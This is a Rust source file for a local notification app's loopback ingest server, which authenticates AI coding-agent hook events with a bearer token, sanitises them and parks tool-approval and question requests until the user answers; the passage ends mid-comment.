//! Loopback-only ingest server (ARCHITECTURE.md §4, PRD FR-1).
//!
//! Binds 127.0.0.1 on a random free port, writes the port and a per-install
//! bearer token to `~/.pingmybell/` with user-only permissions, and accepts
//! normalized events on `POST /v1/event`. Bad input is logged and dropped —
//! never a crash (AC-1.3).

use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Instant;
use std::{fs, io};

use axum::body::Bytes;
use axum::extract::State;
use axum::http::{HeaderMap, StatusCode};
use axum::routing::post;
use axum::Router;
use rand::RngCore;
use subtle::ConstantTimeEq;
use tauri::{AppHandle, Emitter, Manager};

use crate::broker::{
    ApprovalInfo, Broker, Deadline, Expiry, QuestionInfo, QuestionOutcome, QuestionSpec,
};
use crate::overlay::Overlay;
use crate::registry::{AgentKind, EventKind, NormalizedEvent, Registry, Session, Ticked};
use crate::speaker::{self, Priority, SpeakerHandle, Utterance};
use crate::{adapters, summarize};

// ─── Park budgets ───────────────────────────────────────────────────────────
//
// How the numbers nest, outermost first (all seconds):
//
//   600  agent hook timeout   — what the installers write for the QUESTION
//                               matcher in ~/.claude/settings.json and
//                               ~/.codex/hooks.json. Verified empirically
//                               against claude 2.1.198: a PreToolUse hook
//                               configured at 600 was allowed to run 560 s
//                               and its deny still reached the model, so the
//                               old 120 s figure was our config, not a hard
//                               cap. Codex's own default is 600. The gated
//                               tools (Bash/Write/Edit/…) keep 120 s — they
//                               never extend, so they need no more.
//   570  shim question read timeout (`QUESTION_READ_TIMEOUT` in shim/src/main.rs)
//   540  question park CEILING — the furthest a park can ever be extended
//   110  question park BASE    — what an UNTOUCHED question gets
//   110  approval park         — unextendable; an approval is a 2 s decision
//
// Each layer must strictly outlast the one below it, so whoever gives up
// first is always US and never the agent: the shim then prints nothing and
// exits 0, and the agent renders its own selector (PRD AC-2.4).

/// Broker wait before answering 204. Also the BASE park for questions: a
/// question nobody is answering must still fall through promptly. Env
/// override exists for integration testing only.
const APPROVAL_TIMEOUT_SECS: u64 = 110;

/// Hard cap on an extended question park. Sized from the 600 s hook timeout
/// minus enough grace for the shim's read timeout (570) to expire first and
/// for its answer to be written and parsed.
const QUESTION_MAX_PARK_SECS: u64 = 540;

/// How much time one sign of life buys. Long enough that a user who pauses
/// mid-sentence to think does not lose the question. The reply window stops
/// beating once the user has been idle for the same 120 s, so a window left
/// open on a locked screen releases the agent in ~4 min rather than sitting
/// on the ceiling.
pub const TYPING_EXTENSION: std::time::Duration = std::time::Duration::from_secs(120);

/// The decide/answer-vs-timeout race window: when the UI grabbed the entry
/// just as the timer fired, its send is imminent — wait briefly so the click
/// still counts.
const RACE_GRACE: std::time::Duration = std::time::Duration::from_millis(50);

fn env_secs(key: &str, default: u64) -> std::time::Duration {
    let secs = std::env::var(key)
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(default);
    std::time::Duration::from_secs(secs)
}

fn approval_timeout() -> std::time::Duration {
    env_secs("PINGMYBELL_APPROVAL_TIMEOUT_SECS", APPROVAL_TIMEOUT_SECS)
}

fn question_max_park() -> std::time::Duration {
    env_secs("PINGMYBELL_QUESTION_MAX_PARK_SECS", QUESTION_MAX_PARK_SECS)
}

/// `~/.pingmybell/`, created 0700 on unix (AC-1.1). On Windows this relies on
/// the default `%USERPROFILE%` ACL inheritance; tighten explicitly when the
/// Windows work lands.
pub fn data_dir() -> io::Result<PathBuf> {
    let home = dirs::home_dir()
        .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "no home directory"))?;
    let dir = home.join(".pingmybell");
    fs::create_dir_all(&dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&dir, fs::Permissions::from_mode(0o700))?;
    }
    Ok(dir)
}

struct AppState {
    token: String,
    app: AppHandle,
    registry: Arc<Registry>,
    speaker: SpeakerHandle,
    overlay: Option<Arc<Overlay>>,
    broker: Arc<Broker>,
    /// Per-session pacing for the activity ticker (§12.1).
    activity: ActivityThrottle,
    /// The local day whose digest has been spoken (§12.5). Shared with the
    /// launch catch-up through Tauri's managed state, so the two triggers
    /// cannot both decide they own today.
    digest: Arc<crate::digest::Claim>,
}

pub async fn serve(
    app: AppHandle,
    registry: Arc<Registry>,
    speaker: SpeakerHandle,
    overlay: Option<Arc<Overlay>>,
    broker: Arc<Broker>,
    digest: Arc<crate::digest::Claim>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let dir = data_dir()?;

    let mut raw = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut raw);
    let token: String = raw.iter().map(|b| format!("{b:02x}")).collect();

    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await?;
    let port = listener.local_addr()?.port();

    write_private(&dir.join("token"), token.as_bytes())?;
    write_private(&dir.join("port"), port.to_string().as_bytes())?;
    log::info!("ingest server listening on 127.0.0.1:{port}");

    let state = Arc::new(AppState {
        token,
        app,
        registry,
        speaker,
        overlay,
        broker,
        activity: ActivityThrottle::default(),
        digest,
    });
    let router = Router::new()
        .route("/v1/event", post(post_event))
        .route("/v1/approval", post(post_approval))
        .route("/v1/question", post(post_question))
        .route("/v1/activity", post(post_activity))
        .with_state(state);

    axum::serve(listener, router).await?;
    Ok(())
}

/// Write a file with 0600 permissions on unix (AC-1.1); Windows inherits the
/// user-profile ACLs (see `data_dir`).
fn write_private(path: &Path, contents: &[u8]) -> io::Result<()> {
    let mut opts = fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut file = opts.open(path)?;
    // mode() only applies on create; re-assert for pre-existing files
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        file.set_permissions(fs::Permissions::from_mode(0o600))?;
    }
    file.write_all(contents)?;
    Ok(())
}

/// Constant-time bearer-token check (§9 invariant 1).
fn authorized(headers: &HeaderMap, token: &str) -> bool {
    let Some(value) = headers.get("authorization").and_then(|v| v.to_str().ok()) else {
        return false;
    };
    let Some(presented) = value.strip_prefix("Bearer ") else {
        return false;
    };
    let a = presented.as_bytes();
    let b = token.as_bytes();
    a.len() == b.len() && bool::from(a.ct_eq(b))
}

async fn post_event(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    body: Bytes,
) -> StatusCode {
    if !authorized(&headers, &state.token) {
        return StatusCode::UNAUTHORIZED;
    }

    let mut event: NormalizedEvent = match serde_json::from_slice(&body) {
        Ok(event) => event,
        Err(err) => {
            log::warn!("dropping malformed event payload: {err}");
            return StatusCode::BAD_REQUEST;
        }
    };

    // Normalize the summary up front: cleanup happens in core (§5.1), and raw
    // assistant text must never be persisted or logged (§9 invariant 4) — the
    // registry stores exactly what we'd speak, ≤220 chars.
    event.summary = match event.summary.take() {
        Some(raw) => non_empty(summarize::clean(&raw)),
        None if event.event == EventKind::TurnComplete && event.agent == AgentKind::ClaudeCode => {
            transcript_summary(event.transcript_path.clone()).await
        }
        None => None,
    };

    // The emit happens inside apply's notify callback, under the registry
    // lock, so concurrent events for one session reach the UI in order.
    match state.registry.apply(&event, |snapshot| {
        if let Err(err) = state.app.emit("session-updated", snapshot) {
            log::warn!("failed to emit session-updated: {err}");
        }
    }) {
        Ok((session, _)) => {
            dispatch_callout(&state.speaker, &event, &session);
            if let Some(overlay) = &state.overlay {
                overlay.on_event(&event, &session);
            }
            arm_reminder(&state, &event, &session);
            // The first event of a local day is the moment the user sat down,
            // which is exactly when yesterday is worth hearing about (§12.5).
            // Off the reactor: it queries the events table.
            let digest_state = Arc::clone(&state);
            tauri::async_runtime::spawn_blocking(move || {
                if crate::digest::speak_if_due(
                    &digest_state.digest,
                    &digest_state.registry,
                    &digest_state.speaker,
                ) {
                    if let Err(err) = digest_state.app.emit("digest-ready", ()) {
                        log::debug!("digest: could not tell the board: {err}");
                    }
                }
            });
            StatusCode::ACCEPTED
        }
        Err(err) => {
            log::error!("registry failed to apply event: {err}");
            StatusCode::INTERNAL_SERVER_ERROR
        }
    }
}

// ─── Activity ticker (§12.1) ────────────────────────────────────────────────
//
// `PostToolUse` narrates a turn that would otherwise be a silent dot for its
// whole length. It is the one ingest path that deliberately writes NOTHING:
// no events row, no state transition, no utterance. Its own route rather than
// an `event` kind, so an activity CANNOT reach `Registry::apply` by accident —
// the type that arrives here has no way in.

/// A tool name is an identifier, not prose; the ticker shows it verbatim.
const ACTIVITY_TOOL_CHARS: usize = 24;

/// One label per tool call — a basename or a command's first word (§12.1).
/// The shim already reduced the payload to this much; the cap is the same
/// belt-and-braces the card labels get, applied where every other external
/// string is cleaned: at ingress, in the core.
const ACTIVITY_LABEL_CHARS: usize = 48;

/// At most one `session-activity` per session per window. A parallel tool
/// burst is common and would otherwise turn the island into a strobe; the
/// trailing emit reads the registry, so the NEWEST label always wins.
const ACTIVITY_COALESCE: std::time::Duration = std::time::Duration::from_millis(500);

/// Forget a session's pacing state once it has been quiet for this long, so
/// the map tracks live tickers rather than every session of the day.
const ACTIVITY_FORGET: std::time::Duration = std::time::Duration::from_secs(60);

/// How long an armed trailing emit is believed in. Well past the window it
/// sleeps for, and short enough that a task the runtime never ran — dropped
/// on shutdown, starved, or lost across a laptop suspend — cannot silence a
/// session's ticker for the rest of the day.
const ACTIVITY_STALE_ARM: std::time::Duration = std::time::Duration::from_secs(5);

/// What the shim sends per tool call. Deliberately tiny: a tool name and ONE
/// label, never arguments and never content (§9 invariant 4).
#[derive(serde::Deserialize)]
struct ActivityPayload {
    session_id: String,
    tool: String,
    #[serde(default)]
    label: Option<String>,
}

/// Pacing state for one session's ticker.
struct Pace {
    last_emit: std::time::Instant,
    /// A trailing emit is already scheduled; further calls inside the window
    /// only need to update the registry, which they have already done.
    armed: bool,
}

/// What to do with an activity that just arrived.
#[derive(Debug, PartialEq, Eq)]
enum Admit {
    Now,
    /// Emit once, after this long, from whatever the registry holds then.
    After(std::time::Duration),
    Skip,
}

#[derive(Default)]
struct ActivityThrottle {
    sessions: std::sync::Mutex<std::collections::HashMap<String, Pace>>,
}

impl ActivityThrottle {
    fn admit(&self, session_id: &str, now: std::time::Instant) -> Admit {
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner());
        // Cheap because it only ever walks live tickers: entries disappear a
        // minute after their session stops calling tools. An entry armed a
        // whole minute ago belongs to a trailing emit that is never coming,
        // and sweeping it is exactly the recovery we want.
        sessions.retain(|_, pace| now.duration_since(pace.last_emit) < ACTIVITY_FORGET);
        match sessions.get_mut(session_id) {
            None => {
                sessions.insert(
                    session_id.to_string(),
                    Pace {
                        last_emit: now,
                        armed: false,
                    },
                );
                Admit::Now
            }
            Some(pace) => {
                let since = now.duration_since(pace.last_emit);
                // Armed is checked FIRST. A trailing emit is a promise that
                // one is coming with the newest label, so emitting here as
                // well — which is what a late task made the elapsed-time
                // branch do — buys nothing but a duplicate. Believed in only
                // for as long as a task can plausibly still be waiting.
                if pace.armed && since < ACTIVITY_STALE_ARM {
                    Admit::Skip
                } else if since >= ACTIVITY_COALESCE {
                    pace.last_emit = now;
                    pace.armed = false;
                    Admit::Now
                } else {
                    pace.armed = true;
                    Admit::After(ACTIVITY_COALESCE - since)
                }
            }
        }
    }

    /// The trailing emit fired: the window restarts from here.
    fn disarm(&self, session_id: &str, now: std::time::Instant) {
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner());
        if let Some(pace) = sessions.get_mut(session_id) {
            pace.last_emit = now;
            pace.armed = false;
        }
    }
}

/// `Bash: cargo`, `Edit: registry.rs`, or just `Read` when the shim had no
/// label worth sending. None when there is not even a tool name — nothing to
/// show, so nothing is emitted.
fn activity_text(tool: &str, label: Option<&str>) -> Option<String> {
    let (tool, tool_truncated) = summarize::sanitize_capped(tool, ACTIVITY_TOOL_CHARS);
    if tool.is_empty() {
        return None;
    }
    let mut out = tool;
    if tool_truncated {
        out.push('…');
    }
    let label = label
        .map(|raw| summarize::sanitize_capped(raw, ACTIVITY_LABEL_CHARS))
        .filter(|(text, _)| !text.is_empty());
    if let Some((text, truncated)) = label {
        out.push_str(": ");
        out.push_str(&text);
        if truncated {
            out.push('…');
        }
    }
    Some(out)
}

/// `POST /v1/activity` — one tool call, one ticker label (§12.1).
///
/// Always answers 202 for a well-formed body, including when the session is
/// unknown: the shim is fire-and-forget and cannot act on anything else, and a
/// PostToolUse for a session no lifecycle event vouches for is dropped rather
/// than allowed to invent a board row.
async fn post_activity(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    body: Bytes,
) -> StatusCode {
    if !authorized(&headers, &state.token) {
        return StatusCode::UNAUTHORIZED;
    }
    let payload: ActivityPayload = match serde_json::from_slice(&body) {
        Ok(payload) => payload,
        Err(err) => {
            log::warn!("dropping malformed activity payload: {err}");
            return StatusCode::BAD_REQUEST;
        }
    };
    let Some(text) = activity_text(&payload.tool, payload.label.as_deref()) else {
        return StatusCode::BAD_REQUEST;
    };
    // Memory is updated on EVERY call even when the emit is coalesced away:
    // that is what makes the trailing emit carry the newest label.
    match state.registry.record_activity(&payload.session_id, &text) {
        Ticked::Shown => {}
        // Recorded but invisible (parked, finished) or nothing to record at
        // all: either way there is nothing for a surface to redraw, and a
        // session that keeps calling tools while parked must not cost one
        // emit per window to display nothing.
        Ticked::Hidden | Ticked::Unknown => return StatusCode::ACCEPTED,
    }

    match state.activity.admit(&payload.session_id, Instant::now()) {
        Admit::Now => emit_activity(&state, &payload.session_id),
        Admit::Skip => {}
        Admit::After(delay) => {
            let state = Arc::clone(&state);
            let session_id = payload.session_id.clone();
            tauri::async_runtime::spawn(async move {
                tokio::time::sleep(delay).await;
                state.activity.disarm(&session_id, Instant::now());
                emit_activity(&state, &session_id);
            });
        }
    }
    StatusCode::ACCEPTED
}

/// Push the newest label for one session to both surfaces.
///
/// Reads the registry rather than carrying a captured label, so a trailing
/// emit scheduled half a second ago ships what is true NOW — and ships an
/// explicit `null` if the session finished or parked in the meantime, which is
/// what lets a coalesced beat correct itself instead of stranding a ticker on
/// a row that is no longer running.
fn emit_activity(state: &AppState, session_id: &str) {
    let Some(session) = state.registry.get(session_id) else {
        return;
    };
    // Its own event, NOT `session-updated`: that one means "a lifecycle event
    // landed", and the board answers it by re-pulling the whole snapshot and
    // reloading the open history drawer — one `SELECT` per live session plus
    // fifty rows, twice a second, for a change that by construction writes no
    // history at all. This carries the one field that moved.
    if let Err(err) = state.app.emit(
        "session-activity",
        ActivityUpdate {
            id: &session.id,
            activity: session.activity_label(),
        },
    ) {
        log::warn!("failed to emit session-activity: {err}");
    }
    if let Some(overlay) = &state.overlay {
        // Contents only: the island's geometry depends on the number of rows,
        // which an activity never changes, so no window op is needed — and
        // nothing at all is sent while the list is collapsed.
        overlay.refresh_activity();
    }
}

/// The one field an activity moves, for the surfaces to merge in place.
#[derive(Clone, serde::Serialize)]
struct ActivityUpdate<'a> {
    id: &'a str,
    activity: Option<String>,
}

/// Completion summary read back from the transcript, for a Stop hook that
/// carried no `last_assistant_message` (§5.1).
///
/// `transcript_path` comes verbatim out of the request body, and reading it
/// is blocking file I/O plus JSONL parsing over a 256 KB tail. None of that
/// may run on an async worker: a worker parked in `open()` on a FIFO is a
/// worker gone for good, and enough of them stop the runtime — ingest stops
/// accepting and every parked approval stops waking. The adapter refuses
/// anything that is not a regular file; this keeps even the legitimate read
/// off the reactor. Cleaning happens inside the same blocking hop, since it
/// walks the same 256 KB.
async fn transcript_summary(transcript_path: Option<String>) -> Option<String> {
    let path = transcript_path.filter(|p| !p.is_empty())?;
    tauri::async_runtime::spawn_blocking(move || {
        adapters::claude_code::last_assistant_message(Path::new(&path))
            .map(|raw| summarize::clean(&raw))
    })
    .await
    .ok()
    .flatten()
    .and_then(non_empty)
}

/// Hand a session that was waiting on the user back to Working, for a park
/// that ended WITHOUT a decision: an approval that timed out, or a shim that
/// died mid-park. `record_decision` covers the only path that ends in an
/// answer; every other one used to leave the row reading "waiting on you"
/// until the app restarted.
///
/// Off the reactor, because `clear_attention_state` takes the registry lock
/// and writes to SQLite while the callers are `Drop` guards that can run on
/// an async worker as a cancelled handler future is torn down.
///
/// It must not resurrect a session that has legitimately moved on, which is
/// why both checks happen when the task RUNS rather than when it is queued:
///
///   * a sibling card still parked for this session owns the attention state
///     — clearing it would report "working" underneath a card that is still
///     up. Same rule the `decide` command applies before resuming;
///   * `clear_attention_state` only ever unsticks a session still sitting in
///     NeedsAttention, so one that has since gone working/done/ended is
///     untouched — including the ordinary decided path, where the decision
///     already moved it and this is a no-op.
///
/// One window the sibling check does NOT cover: `post_approval` and
/// `post_question` both call `registry.apply` (→ NeedsAttention) before
/// `broker.register`, so a release landing between those two calls for a
/// DIFFERENT park in the same session sees nothing pending and reports
/// working under a card about to be pinned. Two microsecond-wide windows have
/// to overlap for it, and the next event for that session corrects it —
/// closing it properly means registering the park before applying the event,
/// which is a change to the broker's contract rather than to this function.
fn release_attention(
    session_id: String,
    close_event: Option<i64>,
    registry: Arc<Registry>,
    broker: Arc<Broker>,
    app: Option<AppHandle>,
) {
    tauri::async_runtime::spawn_blocking(move || {
        release_attention_now(&session_id, close_event, &registry, &broker, app.as_ref());
    });
}

/// The blocking half, so it can be tested without a runtime.
fn release_attention_now(
    session_id: &str,
    close_event: Option<i64>,
    registry: &Registry,
    broker: &Broker,
    app: Option<&AppHandle>,
) {
    if broker.has_pending_for_session(session_id) {
        return;
    }
    if !registry.clear_attention_state(session_id, close_event) {
        return;
    }
    let Some(app) = app else {
        return;
    };
    // The registry no longer says this session needs anyone, so the pinned
    // card has to go with it. The overlay prunes stale pins against a
    // registry snapshot, but only when something makes it emit — and for the
    // case that matters most here, an agent killed while parked, no further
    // event for that session is ever coming. Without this nudge the card
    // waits for some OTHER session to happen to emit, and outranks the
    // expanded list the whole time.
    //
    // Unpin BEFORE looking the session up. `SessionEnd` and `delete` both
    // drop a session from the live map, so a lookup between them and here
    // returns None — and hanging the unpin off that would skip it in exactly
    // the case this exists for. Other paths happen to cover those two today,
    // but that is an argument in two other files; this way the card cannot
    // outlive the state that justified it, whatever else raced.
    if let Some(overlay) = app.try_state::<Arc<crate::overlay::Overlay>>() {
        overlay.inner().clear_attention(session_id);
    }
    // The board redraws from this; a session already gone from the live map
    // has nothing to send, and its row is going away regardless.
    if let Some(session) = registry.get(session_id) {
        if let Err(err) = app.emit("session-updated", session) {
            log::warn!("failed to emit session-updated: {err}");
        }
    }
}

/// Cleanup that also runs when the parked handler future is CANCELLED (the
/// shim's connection died mid-wait: user hit Esc, closed the terminal, agent
/// crashed). Without it the pinned card would be stranded — clickable, on
/// top of the screen, forever. Every call is idempotent, so running after a
/// normal decision/timeout is harmless.
struct ApprovalCleanup {
    id: String,
    session_id: String,
    /// The `permission_request` row this park belongs to, so ending the wait
    /// closes THIS span and not a sibling's (§11.4).
    event_id: i64,
    broker: Arc<Broker>,
    overlay: Option<Arc<Overlay>>,
    registry: Arc<Registry>,
    /// None only in unit tests, which have no Tauri app to reach.
    app: Option<AppHandle>,
}

impl Drop for ApprovalCleanup {
    fn drop(&mut self) {
        self.broker.expire(&self.id);
        if let Some(overlay) = &self.overlay {
            overlay.unpin_approval(&self.id);
        }
        // The card is gone; the ROW must stop saying "waiting on you" too.
        // This runs on every exit from the handler, so it covers the timeout
        // and the cancelled-mid-park cases alike — after `expire` above, so
        // the pending check inside can never see the entry we just retired.
        release_attention(
            self.session_id.clone(),
            Some(self.event_id),
            self.registry.clone(),
            self.broker.clone(),
            self.app.clone(),
        );
    }
}

/// Blocking long-poll for PreToolUse (§4, FR-6). Registers the request with
/// the broker, pins the overlay card, announces it (preempting the speaker
/// queue), and parks until the user decides or the timeout hits (→ 204, and
/// Claude Code falls back to its own terminal prompt — AC-6.3).
async fn post_approval(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    body: Bytes,
) -> axum::response::Response {
    use axum::response::IntoResponse;

    if !authorized(&headers, &state.token) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let mut event: NormalizedEvent = match serde_json::from_slice(&body) {
        Ok(event) => event,
        Err(err) => {
            log::warn!("dropping malformed approval payload: {err}");
            return StatusCode::BAD_REQUEST.into_response();
        }
    };
    // Clean the summary exactly like the other two ingest paths do: whatever
    // arrives here is inserted into the events table by `apply` below. Our
    // own shim hardcodes `"summary": null` on this route, so today this can
    // only be a no-op — but §9 invariant 4 is enforced at INGRESS precisely
    // so that no change upstream of us can violate it, and this handler was
    // the hole in that argument.
    event.summary = event
        .summary
        .take()
        .and_then(|raw| non_empty(summarize::clean(&raw)));
    let Some(tool) = &event.tool else {
        log::warn!("approval request without tool payload dropped");
        return StatusCode::BAD_REQUEST.into_response();
    };
    // Capped and sanitized here, at the boundary, like every other external
    // string: this one is spoken, rendered on the card, logged, and spoken
    // again by the decision callout (`speaker::callout`) afterwards.
    let tool_name = cap(&tool.name, MAX_TOOL_NAME_CHARS);

    // Voice-only degraded mode (overlay failed to init): there is no way to
    // decide, so parking would just stall the agent for 110 s. Fall straight
    // through to Claude Code's own prompt.
    if state.overlay.is_none() {
        log::info!("approval skipped: overlay unavailable, deferring to terminal");
        return StatusCode::NO_CONTENT.into_response();
    }

    // Record the permission_request in the registry (state → NeedsAttention).
    let (session, event_id) = match state.registry.apply(&event, |snapshot| {
        if let Err(err) = state.app.emit("session-updated", snapshot) {
            log::warn!("failed to emit session-updated: {err}");
        }
    }) {
        Ok(applied) => applied,
        Err(err) => {
            log::error!("registry failed to apply approval event: {err}");
            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
        }
    };

    let (info, rx) = state.broker.register(ApprovalInfo {
        id: String::new(),
        session_id: session.id.clone(),
        event_id,
        agent: event.agent,
        title: session.title.clone(),
        tool_summary: tool_summary(&tool_name, &tool.input),
        tool_name,
    });
    let _cleanup = ApprovalCleanup {
        id: info.id.clone(),
        session_id: session.id.clone(),
        event_id: info.event_id,
        broker: state.broker.clone(),
        overlay: state.overlay.clone(),
        registry: state.registry.clone(),
        app: Some(state.app.clone()),
    };
    log::info!(
        "approval {} pending: {} in session {}",
        info.id,
        loggable_tool_name(&info.tool_name),
        info.session_id
    );

    if let Some(overlay) = &state.overlay {
        overlay.pin_approval(info.clone());
    }
    // Preempting announcement on insert (§6).
    state.speaker.enqueue(Utterance {
        priority: Priority::Approval,
        session_id: session.id.clone(),
        agent: event.agent,
        text: speaker::callout(
            crate::config::speech_style(),
            speaker::Callout::ApprovalRequest {
                tool: &info.tool_name,
            },
            event.agent,
            &info.title,
        ),
        voice_override: None,
        audition: false,
    });

    // Unextendable on purpose: an approval is a two-second yes/no, and a
    // stalled card must not hold a tool call hostage.
    let deadline = Deadline::fixed(approval_timeout());
    let decision = park_until(rx, &deadline, |_| {
        // A fixed deadline can never be extended, so there are only two
        // outcomes here.
        if state.broker.expire(&info.id).is_some() {
            Expiry::Expired
        } else {
            Expiry::Raced
        }
    })
    .await;

    match decision {
        Some(decision) => {
            log::info!("approval {} decided: {}", info.id, decision.as_str());
            axum::Json(serde_json::json!({ "decision": decision.as_str() })).into_response()
        }
        // Nothing to undo in the registry here: `_cleanup` drops as this
        // function returns and releases the attention state for exactly this
        // case (a park that ended with no decision). Doing it twice would
        // just be two trips through the same lock.
        None => {
            log::info!("approval {} timed out; falling back to terminal", info.id);
            if let Some(overlay) = &state.overlay {
                overlay.unpin_approval(&info.id);
            }
            StatusCode::NO_CONTENT.into_response()
        }
    }
}

// ─── AskUserQuestion ────────────────────────────────────────────────────────
//
// A sibling of the approval path: the shim parks an `AskUserQuestion`
// PreToolUse call here so the user can answer from the overlay instead of the
// TUI selector. Unlike approvals this ignores the `gate_tool_calls` flag —
// the agent is already blocked waiting for a human, so there is no latency to
// protect (decided in the shim, see run_question).

/// Caps on the questions we accept from a hook payload. Claude's own limits
/// are ~4 questions × 2–4 options; anything wildly past that is junk, and
/// junk must fall back to the terminal rather than render a monster card.
const MAX_QUESTIONS: usize = 8;
/// Never accept more options than the card is sized to draw.
///
/// This used to be 12 while the overlay sized for 6, so options 7+ AND the
/// actions row rendered below the window edge — for a multiSelect question,
/// where Send is the only way to submit, that made the card unanswerable.
/// Deriving it from the overlay's own constant is what stops that recurring.
///
/// Well above what the tool actually emits (AskUserQuestion allows at most
/// four), so in practice this truncates nothing.
const MAX_OPTIONS: usize = crate::overlay::QUESTION_MAX_OPTIONS;
const MAX_QUESTION_CHARS: usize = 500;
const MAX_HEADER_CHARS: usize = 80;
const MAX_LABEL_CHARS: usize = 200;
const MAX_DESCRIPTION_CHARS: usize = 500;

/// A tool name is an identifier (`Bash`, `mcp__server__tool`), not prose —
/// but it arrives in a payload like everything else, and it is spoken,
/// rendered on the card, and spoken again with the decision. The `Bash`/
/// `apply_patch` dispatch in `tool_summary` matches on it too, so trimming
/// here also means a padded name still routes to the right summary.
const MAX_TOOL_NAME_CHARS: usize = 64;

/// Guards the park against there being no way to answer: without a card,
/// every AskUserQuestion would stall for 110 s before falling through. True
/// since `Overlay::pin_question` and the Svelte question card exist.
const QUESTION_UI_READY: bool = true;

/// The question-specific half of a `/v1/question` body (the rest is a plain
/// normalized event).
#[derive(serde::Deserialize)]
struct QuestionPayload {
    #[serde(default)]
    tool_use_id: Option<String>,
    questions: Vec<QuestionSpec>,
}

/// Parse and sanity-check a `/v1/question` body. `Err` → 400 (AC-1.3: bad
/// input is rejected, never fatal). Strings are trimmed and capped and
/// over-long option lists truncated, but a structurally wrong or unanswerable
/// payload is refused outright so the shim falls open to the TUI selector.
fn parse_question_body(
    body: &[u8],
) -> Result<(NormalizedEvent, Vec<QuestionSpec>, Option<String>), String> {
    let event: NormalizedEvent =
        serde_json::from_slice(body).map_err(|e| format!("event fields: {e}"))?;
    let payload: QuestionPayload =
        serde_json::from_slice(body).map_err(|e| format!("question fields: {e}"))?;

    if payload.questions.is_empty() {
        return Err("no questions in payload".into());
    }
    if payload.questions.len() > MAX_QUESTIONS {
        return Err(format!(
            "{} questions exceeds the {MAX_QUESTIONS} cap",
            payload.questions.len()
        ));
    }

    let mut questions = Vec::with_capacity(payload.questions.len());
    for mut q in payload.questions {
        q.question = cap(&q.question, MAX_QUESTION_CHARS);
        if q.question.is_empty() {
            return Err("question with empty text".into());
        }
        q.header = cap(&q.header, MAX_HEADER_CHARS);
        // Three steps, and the order of all three matters. Cap the TEXT
        // first: a label of nothing but zero-width characters is not
        // `trim`-empty (they are not White_Space), so testing it before the
        // cap let it through to render as a blank, unclickable option. Then
        // drop the blanks, and only then cap the COUNT — truncating first
        // could keep twelve empty labels and leave a card with nothing to
        // click.
        for o in &mut q.options {
            o.label = cap(&o.label, MAX_LABEL_CHARS);
            o.description = cap(&o.description, MAX_DESCRIPTION_CHARS);
        }
        q.options.retain(|o| !o.label.trim().is_empty());
        q.options.truncate(MAX_OPTIONS);
        if q.options.is_empty() {
            // Claude always offers 2–4 options; none means a drifted or junk
            // payload. Refuse rather than park an unanswerable card.
            return Err("question with no usable options".into());
        }
        questions.push(q);
    }

    let tool_use_id = payload
        .tool_use_id
        .map(|id| cap(&id, 128))
        .filter(|id| !id.is_empty());
    Ok((event, questions, tool_use_id))
}

/// Neutralize and truncate in ONE pass, so the `max` characters we keep are
/// `max` VISIBLE characters: a payload cannot spend the budget on invisible
/// padding to push the real text off the card, and a 2 MB question body is
/// scanned but never copied (see `summarize::sanitize_capped`).
fn cap(s: &str, max: usize) -> String {
    summarize::sanitize_capped(s, max).0
}

/// What is safe to put in a log line for a tool name. §9 invariant 2 is "log
/// event kinds only", and this string is payload-controlled: a name shaped
/// like an identifier is genuinely useful when reading logs, anything else is
/// reported by shape and nothing else.
fn loggable_tool_name(name: &str) -> &str {
    // Same budget the name itself is capped at, so a legitimately long MCP
    // name (`mcp__some_server__some_tool`) still reads as itself in the log.
    let identifier = !name.is_empty()
        && name.len() <= MAX_TOOL_NAME_CHARS
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
    if identifier {
        name
    } else {
        "<non-identifier tool name>"
    }
}

/// Cleanup that also runs when the parked handler future is CANCELLED (shim
/// connection death: Esc, closed terminal, `kill -9`). Same guarantee the
/// approval path already needed — a pinned question card must never outlive
/// the request that created it. Idempotent.
struct QuestionCleanup {
    id: String,
    session_id: String,
    /// The attention row this park belongs to (see `ApprovalCleanup`).
    event_id: i64,
    /// None only in unit tests, which have no Tauri app to reach.
    app: Option<AppHandle>,
    broker: Arc<Broker>,
    overlay: Option<Arc<Overlay>>,
    registry: Arc<Registry>,
}

impl Drop for QuestionCleanup {
    fn drop(&mut self) {
        self.broker.expire_question(&self.id);
        // A question that stops being answerable must not leave a focused
        // reply window floating over everything, still pretending it can
        // deliver an answer. It must not SWALLOW the answer either: this runs
        // when the shim's connection died mid-park, which is exactly when the
        // user may be halfway through a long reply, so the window stays put
        // with its text and is told the question is gone. On the answered /
        // deferred paths the prompt has already been cleared, so this is a
        // no-op there.
        // Unpin BEFORE telling the reply window, so the island never renders
        // one frame of a card that is already gone.
        if let Some(overlay) = &self.overlay {
            overlay.unpin_question(&self.id);
        }
        if let Some(app) = &self.app {
            crate::reply::expire_for(app, &self.id);
        }
        // And the row stops saying "waiting on you". Covers the timeout, the
        // "answer in the terminal" defer, and the shim dying mid-park; a
        // question that was actually ANSWERED has already been moved to
        // Working by `record_decision`, which makes this a no-op there.
        release_attention(
            self.session_id.clone(),
            Some(self.event_id),
            self.registry.clone(),
            self.broker.clone(),
            self.app.clone(),
        );
    }
}

/// Blocking long-poll for an `AskUserQuestion` PreToolUse call. Registers the
/// question with the broker, marks the session as needing attention, pins the
/// card, announces it, and parks until the user answers (200 + answers), taps
/// "answer in terminal" (204), or the timeout hits (204 → the TUI selector
